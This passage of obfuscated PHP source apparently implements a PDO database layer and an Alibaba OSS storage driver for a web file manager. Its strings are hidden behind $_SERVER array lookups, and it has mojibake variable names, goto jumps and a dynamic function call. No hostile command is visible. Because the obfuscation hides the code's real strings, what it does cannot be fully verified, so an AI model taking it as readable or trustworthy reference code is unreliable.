$_act($_SERVER[$_SERVER[§Êá¸İ][473]]); } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÑÑ¸ÄÇ¾ = '') { $Æ€…¡ˆ£ =& $_SERVER[§Êá¸İ]; if (!class_exists($Æ€…¡ˆ£[1002])) { think_exception(think_lang($Æ€…¡ˆ£[14]) . $Æ€…¡ˆ£[1003]); } if (!empty($ÑÑ¸ÄÇ¾)) { $this->config = $ÑÑ¸ÄÇ¾; if (empty($this->config[$Æ€…¡ˆ£[17]])) { $this->config[$Æ€…¡ˆ£[17]] = array(); } } } public function connect($ÚÍ©Á–ñ = '', $á˜ «ı = 0) { $ò¢ ÈØç =& $_SERVER[§Êá¸İ]; if (!isset($this->linkID[$á˜ «ı])) { if (empty($ÚÍ©Á–ñ)) { $ÚÍ©Á–ñ = $this->config; } $™¥šåŠß = !empty($ÚÍ©Á–ñ[$ò¢ ÈØç[17]][$ò¢ ÈØç[18]]) ? $ÚÍ©Á–ñ[$ò¢ ÈØç[17]][$ò¢ ÈØç[18]] : $this->pconnect; if ($™¥šåŠß) { $ÚÍ©Á–ñ[$ò¢ ÈØç[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$á˜ «ı] = new PDO($ÚÍ©Á–ñ[$ò¢ ÈØç[1004]], $ÚÍ©Á–ñ[$ò¢ ÈØç[975]], $ÚÍ©Á–ñ[$ò¢ ÈØç[976]], $ÚÍ©Á–ñ[$ò¢ ÈØç[17]]); } catch (PDOException $¦íËÄò¶) { think_exception($¦íËÄò¶->getMessage()); } $this->dbType = $this->_getDsnType($ÚÍ©Á–ñ[$ò¢ ÈØç[1004]]); if (in_array($this->dbType, array($ò¢ ÈØç[1005], $ò¢ ÈØç[1006], $ò¢ ÈØç[1007], $ò¢ ÈØç[1008]))) { think_exception($ò¢ ÈØç[1009] . $this->dbType . $ò¢ ÈØç[1010] . $this->dbType . $ò¢ ÈØç[1011]); } if (!$this->linkID[$á˜ «ı]) { think_exception($ò¢ ÈØç[1012]); } try { $this->linkID[$á˜ «ı]->exec($ò¢ ÈØç[1013] . think_config($ò¢ ÈØç[978])); } catch (Exception $¦íËÄò¶) { } $this->connected = !0; if (1 != think_config($ò¢ ÈØç[22])) { unset($this->config); } } return $this->linkID[$á˜ «ı]; } public function free() { $this->PDOStatement = null; } public function query($Œ®ì¨», $¼«Š˜¼° = array()) { $‰Ñú‚‚¾ =& $_SERVER[§Êá¸İ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Œ®ì¨»; if (!empty($¼«Š˜¼°)) { $this->queryStr .= $‰Ñú‚‚¾[1014] . print_r($¼«Š˜¼°, !0) . $‰Ñú‚‚¾[1015]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‰Ñú‚‚¾[23], 1); think_status($‰Ñú‚‚¾[24]); $this->PDOStatement = $this->_linkID->prepare($Œ®ì¨»); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¶ùÄÕ‹ú = $this->PDOStatement->execute($¼«Š˜¼°); $this->debug(); if (!1 === $¶ùÄÕ‹ú) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($×ÛøÅ»Ü, $Ü¾Ú»¡¸ = array()) { $²Å¯á¼° =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $×ÛøÅ»Ü; if (!empty($Ü¾Ú»¡¸)) { $this->queryStr .= $²Å¯á¼°[1014] . print_r($Ü¾Ú»¡¸, !0) . $²Å¯á¼°[1015]; } $ÙÆÃ§ÃÒ = !1; if ($this->dbType == $²Å¯á¼°[1008]) { if (preg_match($²Å¯á¼°[1016], $this->queryStr, $–Â´ß±)) { $this->table = think_config($²Å¯á¼°[1017]) . str_ireplace(think_config($²Å¯á¼°[1018]), $²Å¯á¼°[454], $–Â´ß±[2]); $ÙÆÃ§ÃÒ = (bool) $this->query($²Å¯á¼°[1019] . strtoupper($this->table) . $²Å¯á¼°[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($²Å¯á¼°[25], 1); think_status($²Å¯á¼°[24]); $this->PDOStatement = $this->_linkID->prepare($×ÛøÅ»Ü); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ãó«Ñâ = $this->PDOStatement->execute($Ü¾Ú»¡¸); $this->debug(); if (!1 === $Ãó«Ñâ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÙÆÃ§ÃÒ || preg_match($²Å¯á¼°[1020], $×ÛøÅ»Ü)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó€à…®Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ó€à…®Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊÛß°ñĞ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÊÛß°ñĞ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ğ¼¡Û´Š = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ğ¼¡Û´Š); return $Ğ¼¡Û´Š; } public function getFields($Úç¬”Ü„) { $´æ°­³÷ =& $_SERVER[§Êá¸İ]; $this->initConnect(!0); if (think_config($´æ°­³÷[1021])) { $¡‹ŠåŠš = str_replace($´æ°­³÷[1022], $Úç¬”Ü„, think_config($´æ°­³÷[1021])); } else { switch ($this->dbType) { case $´æ°­³÷[1005]: case $´æ°­³÷[1023]: $¡‹ŠåŠš = "\123\105\x4c\x45\103\124\x20\40\40\143\x6f\154\x75\155\156\x5f\156\141\155\x65\x20\141\163\40\47\x4e\141\x6d\145\47\x2c\40\40\40\144\141\x74\141\137\164\x79\160\x65\40\x61\163\x20\x27\x54\x79\160\145\x27\54\40\x20\x20\143\157\x6c\165\155\156\x5f\x64\x65\x66\141\165\154\x74\x20\141\x73\40\x27\104\145\146\141\165\x6c\164\x27\54\40\x20\40\x69\x73\137\x6e\x75\154\154\141\142\154\145\x20\141\163\x20\x27\x4e\165\154\x6c\x27\12\11\x9\x46\x52\x4f\115\11\x69\x6e\x66\x6f\162\155\141\x74\151\x6f\156\x5f\163\x63\150\x65\x6d\141\56\x74\141\142\154\145\x73\x20\x41\x53\x20\x74\xa\11\x9\x4a\x4f\x49\116\x9\151\156\146\157\162\155\141\164\x69\x6f\156\137\163\x63\x68\145\155\141\x2e\143\x6f\154\165\x6d\156\163\40\101\x53\x20\143\xa\11\x9\x4f\116\x20\x20\164\x2e\x74\x61\142\154\145\137\143\x61\164\x61\154\x6f\x67\40\75\x20\x63\x2e\x74\141\x62\x6c\x65\137\x63\141\164\141\x6c\x6f\147\xa\11\11\101\116\x44\x20\164\56\x74\x61\142\154\x65\x5f\163\x63\150\145\x6d\141\40\75\40\x63\56\x74\x61\142\x6c\x65\x5f\x73\143\150\x65\155\141\xa\11\x9\101\116\x44\40\x74\x2e\164\141\142\x6c\145\137\x6e\141\x6d\x65\x20\x3d\40\x63\x2e\x74\x61\142\x6c\x65\137\x6e\141\155\x65\12\11\x9\x57\x48\x45\122\x45\x20\x20\x20\x74\x2e\164\x61\x62\154\145\137\156\x61\x6d\145\40\x3d\40\47{$Úç¬”Ü„}\47"; break; case $´æ°­³÷[1024]: $¡‹ŠåŠš = $´æ°­³÷[1025] . $Úç¬”Ü„ . $´æ°­³÷[1026]; break; case $´æ°­³÷[1006]: case $´æ°­³÷[1008]: $¡‹ŠåŠš = $´æ°­³÷[1027] . $´æ°­³÷[1028] . $´æ°­³÷[1029] . strtoupper($Úç¬”Ü„) . $´æ°­³÷[1030] . strtoupper($Úç¬”Ü„) . $´æ°­³÷[1031]; break; case $´æ°­³÷[1032]: $¡‹ŠåŠš = $´æ°­³÷[1033] . $Úç¬”Ü„ . $´æ°­³÷[1034]; break; case $´æ°­³÷[1007]: break; case $´æ°­³÷[1035]: default: $¡‹ŠåŠš = $´æ°­³÷[1036] . ($this->dbType == $´æ°­³÷[1035] ? "\140{$Úç¬”Ü„}\140" : $Úç¬”Ü„); } } $ĞœœÂêµ = $this->query($¡‹ŠåŠš); $ä¦¡şé† = array(); if ($ĞœœÂêµ) { foreach ($ĞœœÂêµ as $šø¢‘ğ => $¾ºêÜ­) { $¾ºêÜ­ = array_change_key_case($¾ºêÜ­); $¾ºêÜ­[$´æ°­³÷[32]] = isset($¾ºêÜ­[$´æ°­³÷[32]]) ? $¾ºêÜ­[$´æ°­³÷[32]] : $´æ°­³÷[454]; $¾ºêÜ­[$´æ°­³÷[33]] = isset($¾ºêÜ­[$´æ°­³÷[33]]) ? $¾ºêÜ­[$´æ°­³÷[33]] : $´æ°­³÷[454]; $¨ˆÑäü½ = isset($¾ºêÜ­[$´æ°­³÷[350]]) ? $¾ºêÜ­[$´æ°­³÷[350]] : $¾ºêÜ­[$´æ°­³÷[32]]; $ä¦¡şé†[$¨ˆÑäü½] = array($´æ°­³÷[32] => $¨ˆÑäü½, $´æ°­³÷[33] => $¾ºêÜ­[$´æ°­³÷[33]], $´æ°­³÷[35] => (bool) (isset($¾ºêÜ­[$´æ°­³÷[106]]) && $¾ºêÜ­[$´æ°­³÷[106]] === $´æ°­³÷[12] || isset($¾ºêÜ­[$´æ°­³÷[35]]) && $¾ºêÜ­[$´æ°­³÷[35]] === $´æ°­³÷[12]), $´æ°­³÷[37] => isset($¾ºêÜ­[$´æ°­³÷[37]]) ? $¾ºêÜ­[$´æ°­³÷[37]] : (isset($¾ºêÜ­[$´æ°­³÷[56]]) ? $¾ºêÜ­[$´æ°­³÷[56]] : $´æ°­³÷[454]), $´æ°­³÷[39] => isset($¾ºêÜ­[$´æ°­³÷[97]]) ? strtolower($¾ºêÜ­[$´æ°­³÷[97]]) == $´æ°­³÷[41] : (isset($¾ºêÜ­[$´æ°­³÷[57]]) ? $¾ºêÜ­[$´æ°­³÷[57]] : !1), $´æ°­³÷[42] => isset($¾ºêÜ­[$´æ°­³÷[1037]]) ? strtolower($¾ºêÜ­[$´æ°­³÷[1037]]) == $´æ°­³÷[44] : (isset($¾ºêÜ­[$´æ°­³÷[97]]) ? $¾ºêÜ­[$´æ°­³÷[97]] : !1)); } } return $ä¦¡şé†; } public function getTables($ßì¿úâ = '') { $Ì‘ÎØ¿ =& $_SERVER[§Êá¸İ]; if (think_config($Ì‘ÎØ¿[1038])) { $¿®·ñÛ¶ = str_replace($Ì‘ÎØ¿[1039], $ßì¿úâ, think_config($Ì‘ÎØ¿[1038])); } else { switch ($this->dbType) { case $Ì‘ÎØ¿[1006]: case $Ì‘ÎØ¿[1008]: $¿®·ñÛ¶ = $Ì‘ÎØ¿[1040]; break; case $Ì‘ÎØ¿[1005]: case $Ì‘ÎØ¿[1023]: $¿®·ñÛ¶ = $Ì‘ÎØ¿[1041]; break; case $Ì‘ÎØ¿[1032]: $¿®·ñÛ¶ = $Ì‘ÎØ¿[1042]; break; case $Ì‘ÎØ¿[1007]: think_exception(think_lang($Ì‘ÎØ¿[1043]) . $Ì‘ÎØ¿[1044]); break; case $Ì‘ÎØ¿[1024]: $¿®·ñÛ¶ = $Ì‘ÎØ¿[45] . $Ì‘ÎØ¿[46] . $Ì‘ÎØ¿[47]; break; case $Ì‘ÎØ¿[1035]: default: if (!empty($ßì¿úâ)) { $¿®·ñÛ¶ = $Ì‘ÎØ¿[986] . $ßì¿úâ . $Ì‘ÎØ¿[987]; } else { $¿®·ñÛ¶ = $Ì‘ÎØ¿[988]; } } } $ˆ°®Û¼Ê = $this->query($¿®·ñÛ¶); $’¹‹°ë¤ = array(); foreach ($ˆ°®Û¼Ê as $¤øÇ¿˜Ï => $š¿Ÿò“­) { $’¹‹°ë¤[$¤øÇ¿˜Ï] = current($š¿Ÿò“­); } return $’¹‹°ë¤; } protected function parseLimit($‘ĞìÒ¡£) { $·Šøù =& $_SERVER[§Êá¸İ]; $¢¸¿Öí³ = $·Šøù[12]; if (!empty($‘ĞìÒ¡£)) { switch ($this->dbType) { case $·Šøù[1032]: case $·Šøù[1024]: $‘ĞìÒ¡£ = explode($·Šøù[50], $‘ĞìÒ¡£); if (count($‘ĞìÒ¡£) > 1) { $¢¸¿Öí³ .= $·Šøù[51] . $‘ĞìÒ¡£[1] . $·Šøù[52] . $‘ĞìÒ¡£[0] . $·Šøù[53]; } else { $¢¸¿Öí³ .= $·Šøù[51] . $‘ĞìÒ¡£[0] . $·Šøù[53]; } break; case $·Šøù[1005]: case $·Šøù[1023]: break; case $·Šøù[1007]: break; case $·Šøù[1006]: case $·Šøù[1008]: break; case $·Šøù[1035]: default: $¢¸¿Öí³ .= $·Šøù[51] . $‘ĞìÒ¡£ . $·Šøù[53]; } } return $¢¸¿Öí³; } public function parseKey(&$Æë—ÁŒ, $Ï·ØãÔâ = true) { $ìÄñâ¢¨ =& $_SERVER[§Êá¸İ]; if ($Ï·ØãÔâ) { $Æë—ÁŒ = $this->parseKeyCheck($Æë—ÁŒ); } if ($this->dbType == $ìÄñâ¢¨[1035]) { if ($Æë—ÁŒ != $ìÄñâ¢¨[220] && !preg_match($ìÄñâ¢¨[998], $Æë—ÁŒ)) { $Æë—ÁŒ = $ìÄñâ¢¨[461] . trim($Æë—ÁŒ, $ìÄñâ¢¨[461]) . $ìÄñâ¢¨[461]; } return $Æë—ÁŒ; } else { return parent::parseKey($Æë—ÁŒ, $Ï·ØãÔâ); } } public function close() { $this->_linkID = null; } public function error() { $¶º£á¬Û =& $_SERVER[§Êá¸İ]; if ($this->PDOStatement) { $å©ÛÊ·É = $this->PDOStatement->errorInfo(); $this->error = $å©ÛÊ·É[1] . $¶º£á¬Û[4] . $å©ÛÊ·É[2]; } else { $this->error = $¶º£á¬Û[12]; } if ($¶º£á¬Û[12] != $this->queryStr) { $this->error .= LNG($¶º£á¬Û[48]) . $this->queryStr; } think_trace($this->error, $¶º£á¬Û[12], $¶º£á¬Û[49]); return $this->error; } public function escapeString($„æÍ¾Š) { $Å€€úê· =& $_SERVER[§Êá¸İ]; switch ($this->dbType) { case $Å€€úê·[1032]: case $Å€€úê·[1005]: case $Å€€úê·[1023]: case $Å€€úê·[1035]: return addslashes($„æÍ¾Š); case $Å€€úê·[1007]: case $Å€€úê·[1024]: case $Å€€úê·[1006]: case $Å€€úê·[1008]: return str_ireplace($Å€€úê·[58], $Å€€úê·[59], $„æÍ¾Š); } } protected function parseValue($¿íù¸¶ï) { $¶êŒùí =& $_SERVER[§Êá¸İ]; if (is_string($¿íù¸¶ï)) { $Ûİñˆõ = strpos($¿íù¸¶ï, $¶êŒùí[4]) === 0 && in_array($¿íù¸¶ï, array_keys($this->bind)); $¿íù¸¶ï = $Ûİñˆõ ? $this->escapeString($¿íù¸¶ï) : $¶êŒùí[1045] . $this->escapeString($¿íù¸¶ï) . $¶êŒùí[1045]; } elseif (isset($¿íù¸¶ï[0]) && is_string($¿íù¸¶ï[0]) && strtolower($¿íù¸¶ï[0]) == $¶êŒùí[373]) { $¿íù¸¶ï = $this->escapeString($¿íù¸¶ï[1]); } elseif (is_array($¿íù¸¶ï)) { $¿íù¸¶ï = array_map(array($this, $¶êŒùí[1046]), $¿íù¸¶ï); } elseif (is_bool($¿íù¸¶ï)) { $¿íù¸¶ï = $¿íù¸¶ï ? $¶êŒùí[91] : $¶êŒùí[228]; } elseif (is_null($¿íù¸¶ï)) { $¿íù¸¶ï = $¶êŒùí[106]; } return $¿íù¸¶ï; } public function getLastInsertId() { $Òß­÷”À =& $_SERVER[§Êá¸İ]; switch ($this->dbType) { case $Òß­÷”À[1032]: case $Òß­÷”À[1024]: case $Òß­÷”À[1005]: case $Òß­÷”À[1023]: case $Òß­÷”À[1007]: case $Òß­÷”À[1035]: return $this->_linkID->lastInsertId(); case $Òß­÷”À[1006]: case $Òß­÷”À[1008]: $ÉòŒŠü¾ = $this->table; $›ê·ë›÷ = $this->query("\x53\x45\x4c\105\x43\x54\x20{$ÉòŒŠü¾}\x2e\143\x75\162\162\166\141\154\40\x63\x75\x72\x72\166\x61\154\x20\106\122\117\x4d\x20\x64\165\141\x6c"); return $›ê·ë›÷ ? $›ê·ë›÷[0][$Òß­÷”À[1047]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÀÈÊƒšÏ) { $¦Û®Ïûê =& $_SERVER[§Êá¸İ]; if (!CacheLock::fileLock($¦Û®Ïûê[13])) { return !1; } $Ã”¿™“„ = parent::query($ÀÈÊƒšÏ); CacheLock::fileUnLock($¦Û®Ïûê[13]); return $Ã”¿™“„; } public function execute($Ô¤ŠÄİç) { $¿ÒÜø•  =& $_SERVER[§Êá¸İ]; if (!CacheLock::fileLock($¿ÒÜø• [13])) { return !1; } $Á–Ï¶±§ = parent::execute($Ô¤ŠÄİç); CacheLock::fileUnLock($¿ÒÜø• [13]); return $Á–Ï¶±§; } } goto dË¥×¡ÖÕ·; c…ñö£±ã³: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ˆ§Âœè) { parent::__construct(); include_once SDK_DIR . $_SERVER[§Êá¸İ][1470]; $this->_init($ˆ§Âœè); } public function _init($ĞÖ¢“Ëç) { $ğÀí€ ¦ =& $_SERVER[§Êá¸İ]; $this->config = $ĞÖ¢“Ëç; foreach ($ĞÖ¢“Ëç as $¼ë´ÍØ => $üà•Ç×¡) { if (isset($this->{$¼ë´ÍØ})) { $this->{$¼ë´ÍØ} = $üà•Ç×¡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ğÀí€ ¦[1471] . LNG($ğÀí€ ¦[1472])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ã¥‹†ôÛ =& $_SERVER[§Êá¸İ]; $¸ÌÛ·” = new OSS\Model\CorsConfig(); $ŞŸ…¾Ò¸ = new OSS\Model\CorsRule(); $ŞŸ…¾Ò¸->addAllowedOrigin($Ã¥‹†ôÛ[1473]); $ŞŸ…¾Ò¸->addAllowedMethod($Ã¥‹†ôÛ[1474]); $ŞŸ…¾Ò¸->addAllowedMethod($Ã¥‹†ôÛ[1475]); $ŞŸ…¾Ò¸->addAllowedMethod($Ã¥‹†ôÛ[1476]); $ŞŸ…¾Ò¸->addAllowedMethod($Ã¥‹†ôÛ[1477]); $ŞŸ…¾Ò¸->addAllowedMethod($Ã¥‹†ôÛ[165]); $ŞŸ…¾Ò¸->setMaxAgeSeconds(600); $ŞŸ…¾Ò¸->addExposeHeader($Ã¥‹†ôÛ[1478]); $ŞŸ…¾Ò¸->addAllowedHeader($Ã¥‹†ôÛ[1473]); $¸ÌÛ·”->addRule($ŞŸ…¾Ò¸); try { $this->client->putBucketCors($this->bucket, $¸ÌÛ·”); } catch (OSS\Core\OssException $ŒÄïºòŞ) { $this->writeLog(__FUNCTION__ . $Ã¥‹†ôÛ[214] . $ŒÄïºòŞ->getMessage()); return !1; } return !0; } public function getBucketCors() { $İœ÷ˆÉÅ =& $_SERVER[§Êá¸İ]; $»öîı”ß = null; try { $»öîı”ß = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $şÈñÄ´Ó) { $this->writeLog(__FUNCTION__ . $İœ÷ˆÉÅ[214] . $şÈñÄ´Ó->getMessage()); return null; } if (!$»öîı”ß || !($Š¦í‹– = $»öîı”ß->getRules())) { return null; } $«û÷´Í• = $Š¦í‹–[0]->getAllowedOrigins(); $è£ˆÒ‡ = $Š¦í‹–[0]->getAllowedMethods(); $ÕÃ“¿ïı = $Š¦í‹–[0]->getMaxAgeSeconds(); $ûô·ÔªĞ = $Š¦í‹–[0]->getExposeHeaders(); $±¼¬œÎ‰ = $Š¦í‹–[0]->getAllowedHeaders(); return array($İœ÷ˆÉÅ[218] => isset($«û÷´Í•[0]) ? $«û÷´Í•[0] : $İœ÷ˆÉÅ[12], $İœ÷ˆÉÅ[222] => $è£ˆÒ‡, $İœ÷ˆÉÅ[1479] => $ÕÃ“¿ïı, $İœ÷ˆÉÅ[1480] => isset($ûô·ÔªĞ[0]) ? $ûô·ÔªĞ[0] : $İœ÷ˆÉÅ[12], $İœ÷ˆÉÅ[219] => isset($±¼¬œÎ‰[0]) ? $±¼¬œÎ‰[0] : $İœ÷ˆÉÅ[12]); } public function isBucketCors() { $‡ûÄ‡ş£ =& $_SERVER[§Êá¸İ]; $°ğÆüæÏ = $this->getBucketCors(); if (!$°ğÆüæÏ || !is_array($°ğÆüæÏ)) { return !1; } if ($°ğÆüæÏ[$‡ûÄ‡ş£[218]] != $‡ûÄ‡ş£[220] || $°ğÆüæÏ[$‡ûÄ‡ş£[219]] != $‡ûÄ‡ş£[220]) { return !1; } $ßÁèÒáš = array_map($‡ûÄ‡ş£[221], $°ğÆüæÏ[$‡ûÄ‡ş£[222]]); if (!is_array($ßÁèÒáš)) { $ßÁèÒáš = array(); } $Éİø àœ = array($‡ûÄ‡ş£[223], $‡ûÄ‡ş£[224], $‡ûÄ‡ş£[225], $‡ûÄ‡ş£[226], $‡ûÄ‡ş£[227]); $µÎ¹Àë‡ = array_diff($Éİø àœ, $ßÁèÒáš); return empty($µÎ¹Àë‡); } public function mkfile($Üù§È¡·, $”¨÷‰Ñ = '', $ºèòƒ´ = REPEAT_RENAME) { $àÛÊÒÕ¤ = $this->setContent($Üù§È¡·, $”¨÷‰Ñ); if ($àÛÊÒÕ¤ !== !1) { return $this->getPathOuter($Üù§È¡·); } return !1; } public function mkdir($ãÅƒôØ…, $ëµ£Í÷­ = REPEAT_SKIP) { if ($ëµ£Í÷­ && $this->_isFolder($ãÅƒôØ…)) { return $this->getPathOuter($ãÅƒôØ…); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ãÅƒôØ…)); } catch (OSS\Core\OssException $ñÀ‰“Äƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $ñÀ‰“Äƒ->getMessage()); return !1; } return $this->getPathOuter($ãÅƒôØ…); } private function fileList($®œ–ğ¨µ, $şÃ¿ş’û = '', $¦çÔòúŞ = 0) { $À‘ùø³š =& $_SERVER[§Êá¸İ]; $®œ–ğ¨µ = trim($®œ–ğ¨µ, $À‘ùø³š[8]); $¼íõƒØ = empty($®œ–ğ¨µ) && $®œ–ğ¨µ !== $À‘ùø³š[228] ? $À‘ùø³š[12] : $®œ–ğ¨µ . $À‘ùø³š[8]; $™ĞÃ°Œ© = $À‘ùø³š[12]; $µáî¡¨ğ = 1000; $††»Ã³í = $ëîÚ¾ºá = array(); while (!0) { check_abort(); $çé„ÈÖî = array($À‘ùø³š[1481] => $şÃ¿ş’û, $À‘ùø³š[1482] => $¼íõƒØ, $À‘ùø³š[1483] => $µáî¡¨ğ, $À‘ùø³š[1484] => $™ĞÃ°Œ©); try { $ØßÏÁßâ = $this->client->listObjects($this->bucket, $çé„ÈÖî); } catch (OSS\Core\OssException $í·ç¬½Ñ) { $this->writeLog(__FUNCTION__ . $À‘ùø³š[214] . $í·ç¬½Ñ->getMessage()); break; } $™ĞÃ°Œ© = $ØßÏÁßâ->getNextMarker(); $‹½«ï–ó = $ØßÏÁßâ->getObjectList(); $Š°’œ„® = $ØßÏÁßâ->getPrefixList(); foreach ($‹½«ï–ó as $¶å˜ïô) { if ($¶å˜ïô->getKey() == $¼íõƒØ) { continue; } $îÉØ©©è = $¶å˜ïô->getKey(); $Ø–ÇŞä = $¶å˜ïô->getSize(); $³ÄõÜÅ = $¶å˜ïô->getLastModified(); $È‹õŠ  = trim($¶å˜ïô->getETag(), $À‘ùø³š[121]); $””û¢ƒ¬ = $¦çÔòúŞ ? array($À‘ùø³š[32] => $îÉØ©©è, $À‘ùø³š[79] => $Ø–ÇŞä, $À‘ùø³š[206] => strtotime($³ÄõÜÅ), $À‘ùø³š[1485] => $È‹õŠ ) : $îÉØ©©è; $Î™¶ºµŠ = $Ø–ÇŞä == 0 && substr($îÉØ©©è, strlen($îÉØ©©è) - 1, 1) == $À‘ùø³š[8] ? !0 : !1; $ĞØ¿Íô¾ = array($À‘ùø³š[79] => $Ø–ÇŞä, $À‘ùø³š[1486] => $Ø–ÇŞä, $À‘ùø³š[88] => strtotime($³ÄõÜÅ), $À‘ùø³š[1487] => $³ÄõÜÅ, $À‘ùø³š[1485] => $È‹õŠ ); $this->cacheMethodInfoSet($îÉØ©©è, $Î™¶ºµŠ, $ĞØ¿Íô¾); if ($Î™¶ºµŠ) { $††»Ã³í[] = $îÉØ©©è; continue; } $ëîÚ¾ºá[] = $””û¢ƒ¬; } foreach ($Š°’œ„® as $Çæ¤ºğ) { $††»Ã³í[] = $Çæ¤ºğ->getPrefix(); $this->cacheMethodInfoSet($Çæ¤ºğ->getPrefix(), !0); } if ($™ĞÃ°Œ© === $À‘ùø³š[12]) { break; } } $this->cacheMethodInfoSet($®œ–ğ¨µ, !0); return array($À‘ùø³š[85] => $††»Ã³í, $À‘ùø³š[86] => $ëîÚ¾ºá); } public function listObject($¦—´¡­, $Ó€ÀÕÉş = '') { $¹â÷„ª¥ =& $_SERVER[§Êá¸İ]; $¦—´¡­ = trim($¦—´¡­, $¹â÷„ª¥[8]); $™Üï“È¥ = empty($¦—´¡­) && $¦—´¡­ !== $¹â÷„ª¥[228] ? $¹â÷„ª¥[12] : $¦—´¡­ . $¹â÷„ª¥[8]; $â§ù¥ùâ = $¹â÷„ª¥[12]; $·¥‹Ğ›¬ = 1000; $úãÖã‚¼ = $â¸«óÙò = array(); while (!0) { check_abort(); $³¹½ÛÑå = array($¹â÷„ª¥[1481] => $Ó€ÀÕÉş, $¹â÷„ª¥[1482] => $™Üï“È¥, $¹â÷„ª¥[1483] => $·¥‹Ğ›¬, $¹â÷„ª¥[1484] => $â§ù¥ùâ); try { $‡è¿¿ÍŠ = $this->client->listObjects($this->bucket, $³¹½ÛÑå); } catch (OSS\Core\OssException $‡„³İä¤) { $this->writeLog(__FUNCTION__ . $¹â÷„ª¥[214] . $‡„³İä¤->getMessage()); break; } $â§ù¥ùâ = $‡è¿¿ÍŠ->getNextMarker(); $ù²Òæâ = $‡è¿¿ÍŠ->getObjectList(); foreach ($ù²Òæâ as $Œ£¥¡ñ) { if ($Œ£¥¡ñ->getKey() == $™Üï“È¥) { continue; } $§ë¡±Ïì = $Œ£¥¡ñ->getKey(); $¤Â‹÷Öœ = $Œ£¥¡ñ->getSize(); $ùÛÀî = $¤Â‹÷Öœ == 0 && substr($§ë¡±Ïì, strlen($§ë¡±Ïì) - 1, 1) == $¹â÷„ª¥[8] ? !0 : !1; if ($ùÛÀî) { continue; } (yield $¤Â‹÷Öœ . $¹â÷„ª¥[214] . $§ë¡±Ïì); } if ($â§ù¥ùâ === $¹â÷„ª¥[12]) { break; } } } public function copyFile($„Ø«Š¨ô, $Êê¶•âÇ) { $ºˆ´„ğ = $this->size($„Ø«Š¨ô); if ($ºˆ´„ğ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $„Ø«Š¨ô, $this->bucket, $this->pathEncode($Êê¶•âÇ)); } catch (OSS\Core\OssException $îÚöğÏ³) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $îÚöğÏ³->getMessage()); return !1; } return $this->getPathOuter($Êê¶•âÇ); } $Ö¦Äû­ = $this->multiCopyObject($„Ø«Š¨ô, $Êê¶•âÇ, $ºˆ´„ğ); return $Ö¦Äû­ ? $this->getPathOuter($Êê¶•âÇ) : !1; } private function multiCopyObject($êŞŒÖæ, $˜—¥ş’, $¤»Ì“Ê­) { $ßö¿°¶ =& $_SERVER[§Êá¸İ]; try { $Ñ«ƒ¾ › = array(); if ($ş¥äØıœ = $this->hashMd5($êŞŒÖæ)) { $Ñ«ƒ¾ › = array(OSS\OssClient::OSS_HEADERS => array($ßö¿°¶[1488] => $ş¥äØıœ)); } $öà‚º¡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($˜—¥ş’), $Ñ«ƒ¾ ›); $úäü›› = 1; $á»—¡ø  = 0; $Î£€¬İ = array(); $°«×ˆÆ = 1024 * 1024 * 10; $¥áå’óê = $this->client->generateMultiuploadParts($¤»Ì“Ê­, $°«×ˆÆ); foreach ($¥áå’óê as $ì±éÒ–Õ => $˜ŸØæĞ) { $ğ­›¢Ì­ = $á»—¡ø  + (int) $˜ŸØæĞ[$ßö¿°¶[1489]]; $¨çÀÈ¶ = (int) $˜ŸØæĞ[$ßö¿°¶[413]] + $ğ­›¢Ì­ - 1; $â¸ÀÕ = array($ßö¿°¶[167] => $ğ­›¢Ì­, $ßö¿°¶[168] => $¨çÀÈ¶); $Î£€¬İ[] = $this->client->uploadPartCopy($this->bucket, $êŞŒÖæ, $this->bucket, $this->pathEncode($˜—¥ş’), $úäü››, $öà‚º¡, $â¸ÀÕ); $úäü›› = $úäü›› + 1; } $÷ÉĞ¿®Á = array(); foreach ($Î£€¬İ as $ì±éÒ–Õ => $÷Á¶…ë) { $÷ÉĞ¿®Á[] = array($ßö¿°¶[308] => $ì±éÒ–Õ + 1, $ßö¿°¶[309] => $÷Á¶…ë); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($˜—¥ş’), $öà‚º¡, $÷ÉĞ¿®Á); } catch (OSS\Core\OssException $İ€ªœà) { $this->writeLog(__FUNCTION__ . $ßö¿°¶[214] . $İ€ªœà->getMessage()); return !1; } return !0; } public function moveFile($Îˆæ—Ê¦, $†¿ıäÓ) { if 